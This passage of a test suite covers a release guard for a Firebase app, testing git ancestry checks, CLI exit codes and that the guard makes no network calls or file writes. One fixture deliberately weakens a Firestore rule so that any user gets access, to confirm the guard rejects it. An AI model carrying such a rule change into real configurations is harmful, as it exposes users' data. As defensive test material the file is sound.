  const code = branch('b-code', { 'functions-westayfit/src/index.ts': indexTs(undefined, undefined, '2026-10-10', '// a quiet code change'), 'apps/westayfit/src/profileConstants.ts': profileConstants('2026-10-10') });
  assert.deepEqual(failed(run(h, { record: 'B', candidate: code }).checks), ['candidate.B-code-equals-A-except-consent']);

  const extra = branch('b-extra', { 'functions-westayfit/src/index.ts': indexTs(undefined, undefined, '2026-10-10'), 'apps/westayfit/src/profileConstants.ts': profileConstants('2026-10-10'), 'firestore.rules': withWsf(GOARRIVE_RULES).replace('request.auth.uid == uid', 'true') });
  assert.deepEqual(failed(run(h, { record: 'B', candidate: extra }).checks), ['candidate.B-changes-only-consent']);

  assert.deepEqual(failed(run(h, { record: 'B', candidate: h.anchor }).checks).includes('candidate.B-descends-from-A'), true);
});

test('git: short or unknown SHAs and an unknown record are usage errors, never verdicts', () => {
  const h = history();
  assert.match(run(h, { candidate: h.anchor.slice(0, 8) }).usage, /40-character/);
  assert.match(run(h, { main: 'f'.repeat(40) }).usage, /not a commit/);
  assert.match(run(h, { record: 'C' }).usage, /A or B/);
});

// ── the CLI and its purity ──────────────────────────────────────────────────

test('cli: the in-process CLI reads the worktree env file and returns exit 0 / 1 / 2', () => {
  const h = history();
  const wt = worktreeAt(h, h.anchor);
  const base = ['--repo', h.dir, '--config', path.join(wt, 'firebase.westayfit.production.json'), '--record', 'A', '--main', h.main];
  const ok = cli([...base, '--candidate', h.anchor, '--command', REVIEWED, '--worktree', wt], { anchor: h.anchor });
  assert.equal(ok.code, 0, JSON.stringify(ok.verdict));
  const noEnv = worktreeAt(h, h.anchor, null);
  const missingEnv = cli([...base, '--candidate', h.anchor, '--command', REVIEWED, '--worktree', noEnv], { anchor: h.anchor });
  assert.equal(missingEnv.code, 1);
  assert.deepEqual(failed(missingEnv.verdict.checks), ['worktree.env-file']);
  const liveFile = path.join(wt, '..', `${path.basename(wt)}-live.rules`);
  fs.writeFileSync(liveFile, '');
  const emptyLive = cli([...base, '--candidate', h.anchor, '--command', RULES_CMD, '--worktree', wt, '--live-rules', liveFile], { anchor: h.anchor });
  assert.equal(emptyLive.code, 2);
  assert.match(emptyLive.verdict.usage, /empty: re-capture the live ruleset/);
  // Without the test-only anchor, the CLI compares with the reviewed ec162d17, which this synthetic clone lacks.
  const reviewed = cli([...base, '--candidate', h.anchor, '--command', REVIEWED, '--worktree', wt]);
  assert.equal(reviewed.code, 2);
  assert.equal(reviewed.verdict.usage, `anchor ${ANCHOR_A} is not a commit in this clone (fetch it first; this guard never fetches)`);
  const interactive = cli([...base, '--candidate', h.anchor, '--command', REVIEWED.replace(' --non-interactive', ''), '--interactive-reason', 'minimum-bill', '--worktree', wt], { anchor: h.anchor });
  assert.equal(interactive.code, 0, JSON.stringify(interactive.verdict));
  assert.equal(interactive.verdict.interactiveReason, 'minimum-bill');
  assert.equal(cli([...base, '--candidate', h.anchor, '--command', REVIEWED.replace(' --non-interactive', ''), '--worktree', wt], { anchor: h.anchor }).code, 1);
  const twice = cli([...base, '--candidate', h.anchor, '--command', REVIEWED, '--worktree', wt, '--candidate', h.main], { anchor: h.anchor });
  assert.equal(twice.code, 2);
  assert.match(twice.verdict.usage, /--candidate is given more than once/);
});

test('cli: the script prints one JSON verdict, exits 2 on unusable input, refuses --anchor, and writes nothing', () => {
  const h = history();
  const before = git(h.dir, 'status', '--porcelain');
  const spawn = (args) => spawnSync(process.execPath, [SCRIPT, '--repo', h.dir, '--config', path.resolve('firebase.westayfit.production.json'), ...args], { encoding: 'utf8' });
  const noAnchor = spawn(['--record', 'A', '--candidate', h.main, '--main', h.main]);
  assert.equal(noAnchor.status, 2, noAnchor.stdout + noAnchor.stderr);
  assert.match(JSON.parse(noAnchor.stdout).usage, new RegExp(`anchor ${ANCHOR_A} is not a commit`));
  const usage = spawn(['--record', 'A', '--candidate', h.anchor]);
  assert.equal(usage.status, 2);
  assert.match(JSON.parse(usage.stdout).usage, /usage/);
  const unknown = spawn(['--record', 'A', '--candidate', h.anchor, '--main', h.main, '--force', 'yes']);
  assert.equal(unknown.status, 2);
  // The reviewed anchor is fixed: the CLI does not let anyone substitute another.
  const anchor = spawn(['--record', 'A', '--candidate', h.anchor, '--main', h.main, '--anchor', h.anchor]);
  assert.equal(anchor.status, 2);
  assert.match(JSON.parse(anchor.stdout).usage, /unknown option anchor/);
  assert.equal(git(h.dir, 'status', '--porcelain'), before);
});

test('purity: the guard has no network, no file writes, and runs no command but git', () => {
  const src = fs.readFileSync(SCRIPT, 'utf8');
  for (const banned of [/\bfetch\(/, /node:https?\b/, /node:net\b/, /node:dgram\b/, /writeFile/, /appendFile/, /createWriteStream/, /mkdirSync/, /rmSync/, /unlinkSync/]) {
    assert.doesNotMatch(src, banned, String(banned));
  }
  const spawned = [...src.matchAll(/execFileSync\(\s*'([^']+)'/g)].map((m) => m[1]);
  assert.deepEqual([...new Set(spawned)], ['git']);
  assert.doesNotMatch(src, /(^|[^.\w])(spawn|spawnSync|exec|execSync)\(/m);
});
